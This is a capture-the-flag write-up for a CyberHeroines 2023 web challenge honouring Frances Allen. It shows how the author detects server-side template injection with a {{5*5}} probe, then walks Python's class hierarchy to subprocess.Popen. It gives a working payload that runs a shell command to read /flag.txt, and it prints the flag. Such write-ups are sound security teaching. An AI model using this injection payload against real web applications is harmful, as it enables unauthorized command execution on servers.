# CyberHeroines 2023

## Frances Allen

> [Frances Elizabeth Allen](https://en.wikipedia.org/wiki/Frances_Allen) (August 4, 1932 – August 4, 2020) was an American computer scientist and pioneer in the field of optimizing compilers. Allen was the first woman to become an IBM Fellow, and in 2006 became the first woman to win the Turing Award. Her achievements include seminal work in compilers, program optimization, and parallelization. She worked for IBM from 1957 to 2002 and subsequently was a Fellow Emerita. - [Wikipedia Entry](https://en.wikipedia.org/wiki/Frances_Allen)
> 
> Chal: Build your best attack against this [webapp](https://cyberheroines-web-srv5.chals.io/) and inspire [the first woman to win the Turing Award](https://www.youtube.com/watch?v=NjoU-MjCws4)
>
>  Author: [TJ](https://www.tjoconnor.org/)
>

Tags: _web_

## Solution
We get a webapp where we can nominate `Cyber Heroines`. Putting in name and a biography we are forwarded to a page that display our input. Checking for `SSTI` we can input eg `{{5*5}}` to one of the fields and: `Nomination received for: asd with bio:25` vulnerable.

From here we only need to find a fitting workload starting with `{{''.__class__.mro()[1].__subclasses__()}}` we get a list of available classes to pick. We find `subprocess.Popen` at position `352`. So we can go futher and call system commands.

```
{{''.__class__.mro()[1].__subclasses__()[352]('cat /flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
```

Gives us the flag.

Flag `chctf{th3re_W4s_n3v3r_a_d0ubt_th4t_1t_w4s_1mp0rt4nt}`